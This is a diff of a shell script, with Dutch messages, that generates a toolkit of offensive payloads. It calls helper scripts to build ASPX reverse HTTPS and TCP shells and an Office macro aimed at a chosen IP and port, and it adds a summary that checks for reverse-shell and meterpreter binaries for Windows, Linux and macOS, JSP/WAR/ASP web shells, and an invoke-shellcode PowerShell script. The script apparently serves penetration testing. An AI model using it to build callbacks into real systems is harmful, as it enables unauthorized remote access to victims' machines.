 echo "[+] Generate ASPX reverse HTTPS shell"
-python3 methaspx.py ${IP} ${PORT}
-cp http/payloads/meth.aspx http/payloads/meth_https.aspx
+python3 methaspx.py "${IP}" "${PORT}" \
+  || echo "[!] methaspx.py (https) mislukt" >&2
+if [ -f "http/payloads/meth.aspx" ]; then
+  cp http/payloads/meth.aspx http/payloads/meth_https.aspx
+else
+  echo "[!] meth.aspx niet gevonden - methaspx.py mislukt?" >&2
+fi
+
 echo "[+] Generate ASPX reverse TCP shell"
-python3 methaspx.py ${IP} ${PORT} windows/x64/shell_reverse_tcp
-
-
+python3 methaspx.py "${IP}" "${PORT}" windows/x64/shell_reverse_tcp \
+  || echo "[!] methaspx.py (tcp) mislukt" >&2
 
 echo "[+] Building MACRO txt"
 echo '#MACRO' >> http/payloads/${BESTAND}_${PORT}.txt
-python3 macro.py ${IP} ${PORT}
-echo "[+] Done"
+python3 macro.py "${IP}" "${PORT}" \
+  || echo "[!] macro.py mislukt" >&2
+
 echo '[payloadsplaceholder]' >> http/payloads/${BESTAND}_${PORT}.txt
-#python3 payloads.py ${IP} ${PORT}
 
+# ── Samenvatting ──────────────────────────────────────────────────────────
+_check() {
+  local label="$1" path="$2"
+  if [ -f "$path" ]; then
+    printf "  [+] %-28s %s\n" "$label" "$path"
+  else
+    printf "  [!] %-28s ONTBREEKT\n" "$label" >&2
+  fi
+}
 
+echo ""
+echo "=========================================="
+echo " Samenvatting -- ${IP}:${PORT}"
+echo "=========================================="
+_check "shell.txt"                  "http/payloads/${BESTAND}_${PORT}.txt"
+_check "shell.exe (win/x86 tcp)"    "http/payloads/${BESTAND}_${PORT}.exe"
+_check "shell.elf (lin/x86 tcp)"    "http/payloads/${BESTAND}_${PORT}.elf"
+_check "shell_x64.elf (lin/x64)"    "http/payloads/${BESTAND}_x64_${PORT}.elf"
+_check "meterpreter.elf (x86)"      "http/payloads/meterpreter_${PORT}.elf"
+_check "meter64.elf (x64)"          "http/payloads/meter64_${PORT}.elf"
+_check "shell.jsp"                  "http/payloads/${BESTAND}_${PORT}.jsp"
+_check "shell.war"                  "http/payloads/${BESTAND}_${PORT}.war"
+_check "shell.asp"                  "http/payloads/${BESTAND}_${PORT}.asp"
+_check "shell.macho (macOS)"        "http/payloads/${BESTAND}_${PORT}.macho"
+_check "meth_https.exe (win/https)" "http/payloads/meth_https_${PORT}.exe"
+_check "meth.exe (https/${PORT})"   "http/payloads/${BESTAND}_meth.exe"
+_check "meth8080.exe (https/8080)"  "http/payloads/meth8080.exe"
+_check "methtcp.exe (tcp)"          "http/payloads/methtcp.exe"
+_check "meth_https.aspx"            "http/payloads/meth_https.aspx"
+_check "meth.aspx (tcp)"            "http/payloads/meth.aspx"
+_check "office_macro.txt"           "http/payloads/office_macro.txt"
+_check "invoke-shellcode.ps1"       "http/payloads/invoke-shellcode.ps1"
+echo "=========================================="
+echo "[+] Klaar -- http/payloads/ en http/commands/ bijgewerkt"
